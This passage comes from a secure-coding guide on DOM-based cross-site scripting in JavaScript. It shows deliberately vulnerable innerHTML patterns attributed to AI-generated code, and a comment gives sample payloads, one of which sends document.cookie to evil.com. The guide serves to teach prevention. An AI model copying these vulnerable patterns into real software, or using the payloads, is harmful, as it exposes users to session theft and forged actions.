---
source: "languages/javascript/xss.md"
title: "Cross-Site Scripting (XSS) — DOM-Based"
heading: "Vulnerable Code Examples"
category: "language-vuln"
language: "javascript"
severity: "critical"
tags: [checklist, code, explanation, javascript, language-vuln, prevention, secure, vulnerability, vulnerable]
chunk: 4/8
---

## Vulnerable Code Examples

### Search Results Display (Real-World Pattern)

```javascript
// 🚫 VULNERABLE — AI-generated search feature
function search() {
  const query = document.getElementById('search').value;
  
  fetch(`/api/search?q=${encodeURIComponent(query)}`)
    .then(r => r.json())
    .then(results => {
      // AI renders results as HTML
      const html = results.map(r => `
        <div class="result">
          <h3>${r.title}</h3>      <!-- 💥 XSS if title contains HTML -->
          <p>${r.snippet}</p>       <!-- 💥 XSS if snippet contains HTML -->
          <a href="${r.url}">Link</a>  <!-- 💥 javascript: protocol injection -->
        </div>
      `).join('');
      
      document.getElementById('results').innerHTML = html;  // 💥
    });
}
```

### Rich Text Editor Misuse

```javascript
// 🚫 VULNERABLE — AI-generated rich text display
function renderArticle(article) {
  // AI assumes server-sanitized content (bad assumption)
  document.getElementById('content').innerHTML = article.body;  // 💥
}

// Even "safe" rich text can contain:
// <img src=x onerror="new Image().src='https://evil.com/steal?data='+document.cookie">
// <svg onload="fetch('/api/delete').then(...)">
// <iframe src="javascript:...">
```

### Third-Party Content Injection

```javascript
// 🚫 VULNERABLE — AI-generated embed widget
function embedContent(url) {
  // AI fetches and renders third-party content
  fetch(url)
    .then(r => r.text())
    .then(html => {
      document.getElementById('embed').innerHTML = html;  // 💥 Complete XSS
    });
}
```

---